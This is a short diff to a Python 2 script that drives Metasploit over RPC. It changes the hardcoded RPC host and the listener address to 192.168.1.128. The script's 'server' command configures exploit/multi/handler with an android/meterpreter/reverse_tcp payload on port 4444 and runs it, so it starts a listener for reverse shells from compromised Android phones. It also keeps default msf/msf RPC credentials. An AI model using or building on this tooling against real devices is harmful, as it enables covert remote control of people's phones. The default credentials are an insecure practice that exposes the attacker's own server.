@@ -37,7 +37,8 @@ class Main:
     username = "msf"
     password = "msf"
     port = 55553
-    host = "127.0.0.1"
+    #host = "127.0.0.1"
+    host = "192.168.1.128"
     ssl = True
 
     # Variables
@@ -87,7 +88,8 @@ class Main:
                 self.host = options.host
             else:
                 print "[*] Use default: host => 127.0.0.1"
-                self.host = "127.0.0.1"
+                #self.host = "127.0.0.1"
+                self.host = "192.168.1.128"
         else:
             if self.host and self.port and self.password and self.ssl and self.username is None:
                 print "[-] You have to specify all hardcoded credentials"
@@ -180,7 +182,7 @@ class Main:
 
             # start msf server and enter again
             if command == "server":
-                command = "use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 172.20.22.202\nset lport 4444"
+                command = "use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 192.168.1.128\nset lport 4444"
                 self.msfconsole.exec_command(command)
                 print self.msfconsole.get_response()
                 self.msfconsole.exec_command("exploit")
